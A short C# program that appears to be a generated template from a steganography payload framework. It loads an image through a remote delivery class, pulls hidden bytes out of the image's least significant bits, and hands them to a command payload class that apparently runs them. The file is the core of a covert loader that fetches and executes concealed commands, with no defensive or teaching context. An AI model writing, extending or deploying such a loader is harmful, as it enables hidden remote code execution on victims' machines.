using System.Drawing;


namespace csharp
{
    class Reader
    {
        static byte[] payload_data;

        static Bitmap bm;


        // TEMPLATES GO HERE
        static delivery.Remote  del  = new delivery.Remote();
        static algorithms.Lsb   algs = new algorithms.Lsb();
        static payloads.Cmd     pld  = new payloads.Cmd();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_bits = System.Int32.Parse(args[0]);
                payload_data = new byte[payload_bits / 8];

                bm = del.load_image(args[1]);
                algs.read_image(bm, payload_data);
                pld.run(payload_data);
            }
        }
    }
}
